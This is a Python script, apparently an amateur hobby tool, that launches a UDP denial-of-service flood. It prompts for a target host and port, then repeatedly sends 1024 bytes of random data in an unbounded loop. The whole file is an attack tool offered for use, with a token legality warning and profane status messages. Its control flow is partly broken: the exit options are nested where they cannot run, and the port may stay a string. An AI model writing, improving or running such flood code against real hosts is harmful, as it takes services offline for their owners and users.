import sys
import time
import socket
import random
import os
import threading
import argparse
import colorama
from colorama import Fore
#\033[0;31;40m


#data = random._urandom(16)
data = random._urandom(1024)


print(Fore.RED + 'Doss Attack')
print(Fore.RED + 'Made by BJW333')
print(Fore.BLUE + '''
         Would you like me to start the Dosser
         [1] start
         [99] exit
''')
Startdoss = input("Your choice here: ")
if Startdoss == "1":
    time.sleep(2)
    print(Fore.BLUE + 'Dossing people is not legal are you sure you wish to continue')
    print(Fore.BLUE + '[1] continue')
    print(Fore.BLUE + '[2] rethink things and exit')
    secondchance = input("Your choice here: ")
    
    if secondchance == "1":
        print("Starting up")
        time.sleep(1)
        print("[                    ] 0%")
        time.sleep(1)
        print("[=====               ] 25%")
        time.sleep(1)
        print("[==========          ] 50%")
        time.sleep(1)
        print("[===============     ] 75%")
        time.sleep(1)
        print("[====================] 100%")
        time.sleep(2)
        print("Time for shit to go offline")
        ip = input("[*] ip or host Target : ")
        port = input("[*] port [Put 0 for port to be default port 80 ] : ")
        if port == "0":
            port = 80
        
        print("Processing targets")
        
        sent = 10

        while True:


            if sent == 1000000000000000000000000:
                print("Taking a break")
                time.sleep(15)
                break

            else:
                pass
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                s.connect((ip,port))
                s.send(data)
                s.sendto(data,addr)
                sent = sent + 1 
                print("Doss Attack starting on " + (ip))
                s.close()
                



        if secondchance == "2":
            time.sleep(2)
            print("Shuting Down")
            exit()
            
    if Startdoss == "99":
        time.sleep(1)
        print("Shuting Down Dosser")
        exit()




    
